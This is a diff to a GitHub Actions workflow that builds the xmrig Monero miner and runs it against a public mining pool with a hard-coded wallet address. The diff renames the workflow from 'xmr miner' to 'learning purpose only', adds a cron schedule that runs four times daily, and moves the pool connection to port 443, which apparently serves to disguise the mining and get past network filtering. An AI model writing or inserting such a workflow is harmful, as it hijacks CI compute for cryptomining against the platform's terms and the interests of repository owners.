@@ -1,12 +1,13 @@
-name: xmr miner 🦹‍♂️
+name: learning purpose only
 
 on:
   push:
-    branches: [ master ]
+    branches: [ master ]  # Trigger on push to the master branch
   pull_request:
-    branches: [ master ]
-
+    branches: [ master ]  # Trigger on pull request to the master branch
   workflow_dispatch:
+  schedule:
+    - cron: '23 4,12,18,0 * * *'  # Runs daily at 6 AM, 12 PM, 6 PM, and midnight
 
 jobs:
   build:
@@ -22,7 +23,9 @@ jobs:
           git clone https://github.com/xmrig/xmrig.git
           mkdir xmrig/build && cd xmrig/build
           cmake ..
+          make  # This step is essential to build xmrig
 
       - name: Runs xmrig
         run: |
-          ./xmrig -o pool.supportxmr.com:3333 -u {49ucRzKeG7XZsdKfCswGEHQstBXpTgKZjFiCrNsqdQnvXBcYb8rDnAqEo8X3FQeve7QaRQqshEPCagDxnL2LVbXPCFb2qQu} -k --tls --rig-id workflow
+          cd xmrig/build  # Ensure we're in the correct build directory
+          ./xmrig -o pool.supportxmr.com:443 -u 49ucRzKeG7XZsdKfCswGEHQstBXpTgKZjFiCrNsqdQnvXBcYb8rDnAqEo8X3FQeve7QaRQqshEPCagDxnL2LVbXPCFb2qQu -k --tls --rig-id workflow
